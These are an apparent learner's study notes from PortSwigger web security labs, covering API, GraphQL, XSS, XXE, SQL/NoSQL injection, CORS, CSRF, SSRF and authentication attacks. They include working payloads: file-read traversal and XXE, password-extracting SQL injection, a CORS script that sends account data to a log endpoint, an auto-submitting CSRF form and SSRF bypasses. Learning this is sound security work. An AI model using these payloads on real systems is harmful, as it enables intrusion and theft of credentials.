<h1>PortSwigger academy</h1>

<h3>Please forgive my grammar. i like to write whatever that comes into my mind first and edit it later</h3>

## Table of Contents
- [Portswigger labs](#Portswigger-labs)
- [API Pentesting](#API-Pentesting)
  - [GraphQL](#GraphQL)
- [Path Traversal](#Path-Traversal)
- [XSS](#cross-site-scripting-xss)
- [XXE](#xxe)
- [Access Control](#access-control)
- [SQL Injection](#SQL-injection)
  - [NoSQL Injection](#NoSQL-injection)
- [CORS](#CORS)
- [CSRF](#CSRF)
- [SSRF](#SSRF)
- [HTTP Request Smuggling](#Request-Smuggling)
- [Authentication](#Authentication)
- [OAuth](#OAuth)
- [WebSocket](#WebSocket)
- [My conclusion](#My-conclusion)

## Portswigger labs

<h3>Lab link: https://portswigger.net/web-security/all-labs</h3>

## <h2>API Pentesting</h2>

<h3>API Enumeration</h3> 

 web fuzzing using **Burp Scanner** (alternative way is web fuzzer such as Feroxbuster or OWASP ZAP)

| API Endpoint Enumeration  | Method |
| ------------- | ------------- |
| Burp Scanner  | automation process  |
| Read API doc  | usually in /api directory  |
| Hidden API endpoint | Burp intruder or Gobuster |


It is also worth checking on JSON, YAML or any JavaScript files as it may contain API endpoints.

| HTTP Method  | Desc. |
| ------------- | ------------- |
| GET  | request resources  |
| POST  | submit requests  |
| Patch | update or modify |



When constructing a request, the JSON format is usually look like this in Burp Suite

```
{
  "username": tester,
  "password": tester
}
```

<h3>Identifying supported HTTP methods</h3>

Basically use **OPTIONS** to see available HTTP options. In HTB, this technique is called **HTTP Tampering** 

<h3>Type Confusion</h3>

The web server sometimes interprets the request differently if the content type isn't what it expect to be.

Usually it involves around **content-type**

```
Example

Content-type: Application/json

This tells the web server, this request contains JSON data
```

<h3>Hidden API endpoint</h3>

Let say you found 
```
POST /api/user/add
```

You can try to fuzzing other endpoint in **/add** using wordlists. You might find other endpoints that look like **/api/user/delete**, **/api/user/update** etc using **Burp Intruder**.

<h3>Mass Assignment Vulnerability</h3>

This attack allows the attackers to insert unknown data parameters in hidden parameters.

```
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

<h3>Server-side parameter pollution</h3>

This attacks allows the attackers to inject payload in input which later on will be sent to internal system where external users couldnt access. If the input isn't sanitize, it could lead to unauthorized access.It is worth checking every input in API endpoints. We could use query syntax like #, &, = to test.

**Test scenario**
```
GET /userSearch?name=peter&back=/home
```

Use **#** to test. **%23** is the encoded format of #

```
GET /userSearch?name=peter%23foo&back=/home
```

**How website process request through URL path vs API?**

![image](https://github.com/user-attachments/assets/46627c6a-ceb5-450a-93b9-d21ec38353bf)

**Path Traversal in API**

```
GET /edit_profile.php?name=peter%2f..%2fadmin
```

if name parameter isn't sanitize, the web server coould interpret it as **name=peter/../admin**. This /../ is like cd i think.

<h3>Server-side pollution with structured data</h3>

```
POST /myaccount
name=peter","access_level":"administrator
```

We can try to add **access_level** parameter to escalate privielge.

in case it is in JSON 

```
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```

<h1>We can use Burp Pro feature to automate the process!</h1>


<h1>Resources</h1>

API endpoint wordlists - https://github.com/chrislockard/api_wordlist

Server-Side Prototype Pollution Scanner - https://portswigger.net/blog/server-side-prototype-pollution-scanner

<h1>Recap & keywords</h1>

1. API enumeration = /api, API doc, Burp Scanner

2. API request enumeration = HTTP tampering, OPTIONS

3. Hidden API endpoints = POST /api/user/??? use Burp intruder

4. Server-side Pollution = try query syntax such as & # = in every parameter. For example **name=eheh&name=eheheh**, Server-Side Prototype Pollution Scanner, access_level=administrator etc

## Path Traversal

Very simple. You found functions, URL or API endpoints that read the file from specified path. In backend, the request should look like this

This is what you see

```
http://www.example.com/user.php?readfile=profile.php
```

This is what acutally happen in backend

```
/var/www/html/users/dummy/profile.php
```

(note that this is just the example)

we can try to request different path using API request. For example

```
http://www.example.com/user.php?readfile=../../../../../etc/passwd
```

../ is basically cd so ../ 5 times you will be at root path

<h2>How can we bypass the whitelist?</h2>

Simply by encoding ../ or ....// . normally the whitelist usually detects and removes ../ so by entering ....// in input the whitelist strips ../ .eventually it becomes ../ . another way is to use non-standard encoding formats.













------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## <h2>GraphQL</h2>

**Trick: GraphQL uses the same endpoints for all requests. This means if you found 1 GraphQL API endpoint you can find the rest API endpoints!**

When we encounter GraphQL, the first thing we need to do it find its endpoint! 

The following query is a universal query for GraphQL

```
query{__typename}
```

so when this query is called the JSON data usually look like this 

```
{ "data": {"__typename": "query"} }
```

Basically a nested JSON parameter. Every GraphQL JSON query always has **__typename**.

When we want to verify GraphQL, we can try these following:

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```

**Note: When you have tried the above endpoints and couldn't find the endpoint, you may try /v1**

**Note2: GraphQL usually responds to non-GraphQL request with "query not present" or something similar.**

<h3>Exploit IDOR or BAC via unsanitized query input</h3>

Usually if the web app uses GraphQL for accessing data, we can play with query. This query sometimes unsanitizes which allows us to access resources.

**GraphQL checked, unsanitized checked. What's next?**

We can use "introspection". It is a built-in GraphQL function which spits out information like API docs and description. These informations are considered a sensitive information. Using:

```
{
        "query": "{__schema{queryType{name}}}"
    }
```

if the introspection doesn't retrieve the schema, try removeing **onOperation**, **onFragment**,and **onField**

if **Introspection is disabled**, we can try built-in suggestions function. This is an alternative way to exploit GraphQL information schema(in this scenario these schema are sensitive data).

**GraphQL exploitation in a nutshell**

Firstly, check that the web app i using GraphQL through requests.

Secondly, after verified the web app is using GraphQL, you can use Burp to perform information schema scanner.

Thirdly, read the schema and find sensitive query, then in the request, you add that sensitiv query to uncover the secret!

**Example**

1. check for GraphQL(very easy to detect)

![image](https://github.com/user-attachments/assets/4f1c03cf-7b55-420f-a97a-dc26d8a9a60d)

2. check for Introspection function. if it enables then you can search information schema

![image](https://github.com/user-attachments/assets/35d9fac4-9179-4f8b-87bb-2ab7b69d28d2)

3. next, in the login page. let's inspect the GraphQL query using inQL extension

![image](https://github.com/user-attachments/assets/5e9d6e7d-597e-4f37-93f1-4492a4e749de)

4. As you can see, getUser query is being called during authentication. Now we can try to copy & paste this query in login request adn change id = 1 since the first id is admin

![image](https://github.com/user-attachments/assets/109ecad3-3815-4e5e-81a1-4b044cb014ce)

Easy peasy. The keypoint is to learn how query work in information schema!

<h3>Bypass GraphQL introsepction defense</h3>

We could try new line, spaces and commas

```
#Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }
```

The example is shown how we can bypass defense by using new line!

or we can bypass with URL path!

```
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

<h3>GraphQL CSRF</h3>

This attack vector allows attackers to perform CSRF via GET request or the content type is **x-www-form-urlencoded** instead of **application/json** or use Burp pro feature called **Generate CSRF PoC**

**Example**

From JSON 

```
{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"heeh@hehe.hehe"}}}
```

to

URL encoded

```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

or

```
query=
    mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
            email
        }
    }
&operationName=changeEmail&variables={"input":{"email":"hacker@hacker.com"}}
```


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


## <h2>Cross-site Scripting (XSS)</h2>

Reflected XSS, where the malicious script comes from the current HTTP request.

Stored XSS, where the malicious script comes from the website's database.

DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.

<h2>Automated tool with Burp Pro Vulnerability Scanner feature</h2>

Details: https://portswigger.net/burp/vulnerability-scanner

<h2>Content security policy</h2>

Content security policy or CSP is used to detect XSS.

DOM-based XSS 

Let say 

```
<img src="/resources/images/tracker.gif?searchTerms=">
```

We can try to create img script tag by 

```
"><svg onload=alert(1)> 
```

So, it will look like this

```
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>
```
Basically just another tag in HTML


<h1>Resources</h1>

XSS cheatsheet - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## XXE

XXE or XML external entity is an attacker that allow attackers to read filesystems and leverage XXE to SSRF to compromise the backend systems.

<h3>Why XXE is dangerous?</h3>

Many websites use XML as a request transportation for API communication.  This has been taught in CPTS path but i forgot lol.

**the concept of XXE**

let say this is a request containing XXE vuln

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

to exploit it you must create an entity using DOCTYPE.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

after the modified request has been sent. You have completed the exploitation!. You can observe the response request to see the output.

Example of XXE via SSRF

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

So as we have learned from SSRF. We can abuse SSRF via the function that leads to execution of the input. because the entity in XML is being executed, we can use URL (which is a normal attack vector for SSRF) to exploit SSRF in XML request.


**XXE attacks via file upload**

We can abuse XXE via SVG file images. Since SVG is practically XML, we can embed the entity to exploit the XXE. To see the output, you simply go to the image location. The output should display as the image!

**XXE attacks via modified content type**

If the web server allows XML request.

By default,

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

so if we want to try to exploit we can cahnge it to

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

Easy peasy!

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Access Control

Basically it's a user-based control where each role has their owns permissions. By abusing these permissions, the vulnerability is called broken access control.

-sometime we can find admin panel from **robots.txt**(better use Burp to crawl those web folders)

-security by obscurity = soemtimes devs obfuscate sensitive web folders to prevent an attacker from crawling. However, there still a way to find admin panel. For example, we can look at the source code in **views** to find a JavaScript that reveals us the admin panel URL.

```
<script>
	var isAdmin = false;
	if (isAdmin) {
		...
		var adminPanelTag = document.createElement('a');
		adminPanelTag.setAttribute('https://insecure-website.com/administrator-panel-yb556');
		adminPanelTag.innerText = 'Admin panel';
		...
	}
</script>
```

-some apps store user privileges and permissions in cookies, query statement or a hidden field. For example,

```
https://insecure-website.com/login/home.jsp?admin=true
https://insecure-website.com/login/home.jsp?role=1
```

-some apps restricts users to access sensitive URLs based on their roles. It should look like this.

```
DENY: POST, /admin/deleteUser, managers
```

so in this case, we can do something like this

```
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
...
```

This will bypass URL restrction:

**X-Original-URL** or **X-Rewrite-URL**





------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## <h2>SQL Injection</h2>

Can be found especially in queries

Useful command when we want to know more about table information.

```
SELECT * FROM information_schema.tables
```

If you want to see tables you can try to exploit it with union-based sql injection.

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

In case we want to retreive tables more than one, we can use concatenation to achieve that.

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

<h3>How to test SQL injection</h3>

Use ' = if there is SQL error message, this means the web app is vulnerable to SQL injection

Ex.

```
https://insecure-website.com/products?category=Gifts'--
```

This means that the statement after -- will be recognized as a comment. In this case the only part that SQL statement will be execute is ?category=Gift

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

**Boolean conditions** checks for conditions

try

```
OR 1=1 # this always returns true
```

or

```
OR 1=2 
```

<h1>THE EASIEST WAY TO DETECT SQL INJECTION IS TO USE BURP SCANNER!</h1>

**Union Injection**

**How to check for database information?**

| Database  | Command |
| ------------- | ------------- |
| Microsoft, MySQL  | SELECT @@version |
| Oracle |SELECT * FROM v$version |
| PostgreSQL | SELECT version() |


Basically retrieve the another table by using UNION. It allows attackers to use SELECT command twice.

```
' UNION SELECT username, password FROM users--
```

Normally, when we test union injection. Firstly, check how many columns the table have. Secondly check which column has a suitable datatype. so that we can use SQL statement to retreive the respective data we want to expose.

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

another way

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**In Oracle database**

We have to add **DUAL** after SELECT / FROM because it is a bult-in. Can't run without it.

```
' UNION SELECT NULL FROM DUAL--
```

**Oracle SQL injection exaple**

```
Accessories'+UNION+SELECT+banner,NULL+FROM+v$version--
```

<h2>WAF Bypass</h2>

We can encode or we can obfuscate the sql statement to bypass the WAF.

Ex. The below is XML-based SQL injection

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

If we want to bypass specific technology, Burp suite provides many extension to help us bypass WAF. For example, if we want to bypass WAF that is implemented in XML, we can use Hackvertor extension to encode our SQL injection command to potentially bypass WAF.



**Out-of-band application security testing (OAST)**

This attacks uses external service to retreive SQL injection attack results. In Burp Suite, it has a dedicated testing server which allows users to perform OOB. This is useful when perform blind sql injection

the SQL injection might work but it doesn't show an error. We can use time delay to identify that or add additional logic condition to trigger an error.

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

The above cookie is a tracking cookie. This cookie is vulnerable to SQL injection since the value of TrackingID is basically SQL statement. However, we couldnt simply use union to exploit this instead we use blind sql injection.

Example

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

The above sql statement checks for administrator in Users table with the logic 1 = 1 is always true. if it is valid then it is greater than m. This means that as long as the welcome back notification is triggered. the result is positive. Now we know the first character of this user's password we can try

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

This time the welcome back notification didn't show up. This means that the letter t isn't the 2nd character of the user's password. Now we try "s".

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 's
```

This time it returns a welcome back message, indicating valid statement.

In conclusion, so far we that this user's password is start with "m" and the second letter is "s". we repeat the process until we found a valid password.


## <h2>NoSQL Injection</h2>

A famouse database. It is different from traditional databases because it uses different query languages. 

Because of the variety of query that's why we can abuse many query syntax as there are many diffrent methods we can try.

**How do we test NoSQL injection?**

the concept is as the same as how we try to exploit sql injection

try:

```
'"`{
;$Foo}
$Foo \xYZ
```

in JSON query try:

```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

**NoSQL statement check**

False statement

```
Gifts' && 0 && 'x
```

True statement

```
Gifts' && 1 && 'x
```

Always true

```
Gifts'||1||'
```

We can also try to add null value. This works like a comment.

```
'%00
```

The result of null value is whatever statement after null value won't be processed. That's how MongoDB intreprets

**NoSQL injection with Operator Injection**


| Operator  | Meaning |
| ------------- | ------------- |
| $where  | Matches documents that satisfy a JavaScript expression. |
| $ne  |Matches all values that are not equal to a specified value. |
| $in | Matches all of the values specified in an array. |
| $regex | Selects documents where values match a specified regular expression. |

To exploit NoSQL Operator Injection, we can try nested objects.

In JSON

**{"username":"wiener"} becomes {"username":{"$ne":"invalid"}}**

In URL path

**username[$ne]=invalid**

<h3>Things to do if URL path doesn't work:</h3>

1. HTTP tampering. Change GET to POST
2. Change the content-type to Application/json
3. Do it in JSON query

<h3>I won't go deeper like how to manual exploit this. The reason is i just want to know how it work and how can i detect it. If i want to exploitm i will use automating tool </h3>

<h1>Resources</h1>

SQL injection cheatsheet - https://portswigger.net/web-security/sql-injection/cheat-sheet

NoSQL automating tool - https://github.com/codingo/NoSQLMap


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## <h2>CORS</h2>

CORS or cross origin resource sharing is a browser mechanism, allowing the web app to use resource across domains. However, if this browser mechanism isn't well implemented, it could become an attacker vector.

SOP or same origin policy is a stricted origin policy. It allows a domain to request to other domains but it couldn't interact with resources.

**The vulnerability lies in the CORS misconfiguration**

How can we know the web app is vulnerable to CORS attack?

We can look at the response request, if the request contains **Access-Control-Allow-Credentials: true**, it uses CORS. Furthurmore, This header allows users to pass credentials in the request as well.

![image](https://github.com/user-attachments/assets/7f428fa4-1228-4214-97ad-7317d560c31e)

**Example**

If the web app is indeed vulnerable, we add Origin: anything and observe the response request.

```
GET /accountDetails HTTP/2
Host: 0a7e002a0386c18a826a063b003d00cb.web-security-academy.net
Cookie: session=HeU2poPXNDfV1PVYHZUs1y64nKtb5iND
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7e002a0386c18a826a063b003d00cb.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Origin: https://google.com
```

Response request

```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://google.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149
{
  "username": "wiener",
  "email": "",
  "apikey": "rgP0rUMKyM1EKlPJomojHMsmxeQChdH9",
  "sessions": [
    "HeU2poPXNDfV1PVYHZUs1y64nKtb5iND"
  ]
}
```

What happens here is that when we add the "Origin" header and the web app return the origin source as a trusted source. This becomes a problem because this web app trust any origin source from 3rd parties and subdomains.

**Script example**

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```


Trusted subdomains are also vulnerable to cors attack. If attackers found any one of subdomains that are vulnerable to XSS. They can use those subdomains as origin source and embed script in the request in the form of XHR script. The concept is pretty much similar. You can just use the vulnerable subdomain in Origin header!

<h3>CORS attack scenario in a nutshell</h3>

Let say you make a request and the response request has **Access-Control-Allow-Credentials: true**. The first assumption is this web app is using CORS. CORS is there to make a request from external 3rd parties and subdomains. Next, we can use burp suite to request another request but this time with **Origin: URL**. If it works you will see the reflected origin url in the response request. Now, we are certain that this web app is vulnerable. Because of **Access-Control-Allow-Credentials: true** we can embed a javascript to steal API or session token and send it to the attacker's machine using XHR. XHR is API that allows users to use script in HTML. The attackers also need their web server running with js script that is waiting for the API token from the request and then save it in let say log.txt or whatever file that specified in the js script. Basically XSS in XHR. 

<h3>Mitigation</h3>

-Use the whitelist. all subdomains should be listed in this whitelist as a trusted source. And make sure none of the subdomains have XSS vulnerability.

-Never used CORS as a security policies as its machanism is intended for accessing 3rd parties resources.

-Don't use null or wildcards in CORS.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## CSRF

CSRF or Cross-site request forgey is basically attackers trick users to perform functions for them. As for targeted functions are usually changing password, changing email, add admin role, submit forms.

<h2>To make the attacker work what you need are 3 things</h2>

1. Function you want users to interact (usually something that can help us compromise accounts)
2. Websites must use cookies (token is uh-uh)
3. Unpredictable param (like enter current password and then new password. since attackers don't know the current password i mean if they know they dont have to do this lol.)

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```
once all conditions are met we go exploittttt

```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**What happen here?**

The above is html page in attacker website. basically a submission form.(i mean in real life it wont be this simple lol as you need to make the page looks real.)

if the victim believes this is a legit website, they click the link, once they click on the link its GG. the form will automatically submitted using the victim session cookies (victim broswer automatically uses session cookies so no need for the victim to login). and more importantly websites must not use SameSite cookies or else we go empty hand.

**Bypass CSRF Token**(i like this topic alot)

-Try GET instead of POST. This may bypass CSRF token

-In some websites, the websites only checks for the word csrf. we can simply remove csrf param lol

-CSRF token is not tied to the user session = this is like CSRF token doesn't validate the owner making it easier for the attacker to just use their CSRF token to change victim email. This means you can use your own CSRF token to change someone else their password or email.

-some websites use 2 frameworks and integrate CSRF token for session cookies but CSRF token doesn't protect the sessoin cookies because it isn't compatible. 

-in some cases, server sides don't store csrf token records. this means the server side only checks whther the csrf token matches the value that submitted in the cookies or not. it's basically a duplicated token. In this case the attacker can just use their csrf token. lol


**How to prevent?**

1. Use CSRF Token. This is like a bad news for the attacker
2. SameSite cookies = ggez
3. Referer validatoin = some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain.

<h2>But ofc if the attacker can bypass CSRF protection then there might be a hope for us(attacker)</h2>





------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



## SSRF

SSRF or server-side reforgery is a technique that attempt to make a web server to force a connection to the external host. in a general situation, SSRF allows attacker to send a request as a web server to the internal host. Basically this technique makes the internal host believes we are a web server!

**Tips: to check for SSRF vulnerability, we should try to add URL in every input!**

<h2>Where to check?</h2>

1. XML data format - SSRF via XXE

2. SSRF via the Referer header (many websites use analytic software tracker, some software like to store referer header!)

**Example**

Let say you want to see products in stock. So you request "stock" function. What happens here is the server is calling the corresponding API to access data in the internal. Then returns the output on the web app.

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```
so what happens if the query param is

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

This result is the request will be sent to the localhost and accessing admin directory. In general, when you access **/admin** via websites, you will have to login first but when you're accessing the **/admin** via the localhost. The server recognizes you as the admin without asking you to login. This causes unauthorized access.

![image](https://github.com/user-attachments/assets/f7a374ce-fbfe-4b44-85fe-639d1555fcac)

Next we have to find the API for deleting users

![image](https://github.com/user-attachments/assets/9b45f0b7-7314-45be-a920-07cec3f37098)

Once we find it we make another request but this time use this API instead of a localhost.

![image](https://github.com/user-attachments/assets/5477139a-6615-4992-91eb-95c4db6b1e2a)

<h3>Bypass SSRF blacklist filters</h3>

1. Some SSRF filters may detects and removes "127.0.0.1" or "localhost". In this casem we can use **2130706433**, **017700000001**, or **127.1**.

2. In /etc/hosts, use a new dns that resolve to 127.0.0.1 and then use this dns in the vulnerable function.

3. Obfuscate special letters with URL encoded.

**Example**

![image](https://github.com/user-attachments/assets/faee16f8-2f22-4a1c-80e8-09290ba0ede7)

What i did here is double URL encoded "a" to bypass the blacklist

<h3>Bypass SSRF whitelist filters</h3>

You can embed credentials in a URL before the hostname, using the @ character. For example:

```
https://expected-host:fakepassword@evil-host
```

You can use the # character to indicate a URL fragment. For example:

```
https://evil-host#expected-host
```

You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:

```
https://expected-host.evil-host
```

<h2>SSRF + Open Redirect</h2>

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

**Another example**

![image](https://github.com/user-attachments/assets/2d1408fe-c72d-409d-b0c3-91b91c925179)

So we kno wthis request is vulnerable to open redirect vuln.

```
POST /product/nextProduct HTTP/2
Host: 0a0b00b904224216812f02e000c200fb.web-security-academy.net
Cookie: session=QvN0T7haiiqeA23Dj469LB2JguLKpox9; session=P4WEAbjdRZvaq0hOL51o9GLtuFabAyNd
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0b00b904224216812f02e000c200fb.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

currentProductId=1&path=http://192.168.0.12:8080/admin
```

So we use this API endpoint in StoredAPI to interact with the above function

![image](https://github.com/user-attachments/assets/03beb472-a90b-4393-bb38-6fa417089b22)

Results

![image](https://github.com/user-attachments/assets/9c8261b9-1c91-458c-b191-13ff12dbba94)

Next we click delete Carlos user to obtain delete API request

![image](https://github.com/user-attachments/assets/d3365674-00f5-4502-812f-444ecf140305)

exploited. the end.

![image](https://github.com/user-attachments/assets/64523a37-129c-4a1e-85a4-64c48adbb899)



------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Authentication

<h3>What kind of vulnerabilities can we found here?</h3>

-Brute forcing

-User enumeration

-Weak cryptographic hash

<h3>Authentication weaknesses</h3>

1. Weak authorization mechanism (like easy password policy)

2. Weak authentication mechanism or poor logic code.

You can think of it as your house's front door. Wooden doors are tended to break easily, unlike metal doors that are strongly dullable.

<h3>So, to the main question, how can we exploit it?</h3> (In the real world scenario, if i don't know the password policy or see valid passwords, i won't waste my time trying to guess passwords lol.)

1. Brute-force attacks - very self explanatory

**Tips: If you found HTTP authentication, you can list it down as a finding. HTTP authenticatoin isn't a good way to implement security as it can be used to brute-force, MiTM, session token hijacking. Normally HTTP authentication stores creds in the Authentication header in base64 format. Unless the web app is implementing HSTS**

<h3>Bypass multi-factor authentication</h3>(Personally, i am very eager to exploit this!)

It is come to how the web security handle the login process, for some website, it asks users to enter a verification code after redirects users to another page. This "another page" is a landing dashboard page. Basically you are already authenticated, but you need a verification code to be able to interact. So the question is if we can bypass this process, we can potentially bypass it!. So in conclusion bypassing authorization is more like finding a way to abuse code logic!


In the given scenario

All you need to do is inspecting requests through Burp. Normally in the lab, after you login you will be redirected to **/my-account**. But because there is 2FA authenthication, it redirects you another page for additional verification, we can use modify the request using intercept and then point it to **GET /my-account** lol.

![image](https://github.com/user-attachments/assets/68a41850-cabf-456a-9733-87dd483b7fe4)

Another scenario

In this scenario the web app is storing username or account-related info in cookies. **This is super duper dangerous as attackers can simply change data in cookies!**

![image](https://github.com/user-attachments/assets/7493c4ae-6d4d-4333-96fb-a06ba4dc084a)



What happens here is: credes are stored in cookies with verify param in the header(it was Wiener but it was testing soemthing so i changed it to Carlos)

After you logged in and verified 2FA. The 2FA request will look like this.

![image](https://github.com/user-attachments/assets/7de45b97-2ff7-4d4f-ba00-68c146dc3164)

Next, we can try to change verify=carlos and send the request to intruder. so that can brute force it!

![image](https://github.com/user-attachments/assets/c544c682-8e31-4158-aa6b-8b1ab9dc4394)


<h3>Additional authentication mechanism</h3>

any mechanism that required authentication is vulnerable to this issue. For example, some websites have a feature such as "Remember me" to keep a session alive. Some websites are even stored a password as a part of session token. In terms of security perspective, it is crucial to make this token unpredictable to kae it impossible for attackers to craft a valid token. However, what if the vulnerable website implenting a weak concatenation? the anwser is yes they f**ked up big time! As this "Remember Me" sessions are usually bypass 2FA authentication!

![image](https://github.com/user-attachments/assets/45200280-5f3d-4054-86a0-cac54097267b)

As you can see from the above image. The token session is stored in Base64 format. If we use Burp, we can see it in a plain text.

using Crackstation or Hash-identifier will give us a plain text password and type of encryption.

![image](https://github.com/user-attachments/assets/4bc331de-a5a9-4ce0-ad16-25aa381e3160)

<h3>Weak password resetting mechanism</h3>

If password resetting is done by sending a new password in email, then it isn't considered to be safe. Think about it, if users have signed in to multiple devices and let say one of them allows attacker to intercept the network traffic using MiTM?

Some websites make it easier for attackers to understand how the function work. The best approach here is to make it hard for attackers understand the function by using the combination of hash and encryption.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## OAuth

OAuth2.0 is used for authentication & authorization. It allows users to use social media account to login to the platform. It is a common framework which can be found in many web apps. 

<h2>What are things included in OAuth?</h2>

**Client application** - The website or web application that wants to access the user's data.

**Resource owner** - The user whose data the client application wants to access.

**OAuth service provider** - The website or application that controls the user's data and access to it.

<h2>How it works? (Overview)</h2>

1. Users request to access web resources

2. The request sends to the owner of the resource with **grant type**. this grant type is a part of OAuth.

3. Users then retrieves session token which will be used to generate API to request resources.

In a nutshell, it involves around asking permission then generate a token to access the corresponding resources.

<h2>More about Grant Type</h2>

Grant type is an element in OAuth, it tells OAuth what kind of permission and resouces the users want to access using "scope" parameter. The below is the example how we can implement it.

```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

<h2>How OAuth works? (In details)</h2>

initially, it redirects users to make a new server which will ask for users consent to share over their information in exchange for "authorization code". This auhtorization code can be leveraged for API. without the consent of users, it would be impossible for users to access resources. Once users agree to share their data, they receive access token, granting them ability to fetch data from API through the server that OAuth established. This process happens without us knowing it happened.

<h2>Keywords</h2>

these can be found in a login page. If you see these informations in Burp, this means there is a high chance the web app is using OAuth.

-client_secret

-scope=????

-grant_type

-client_id

-redirect_uri

-response_type

-state

<h2>OAUth vulnerabilities</h2>

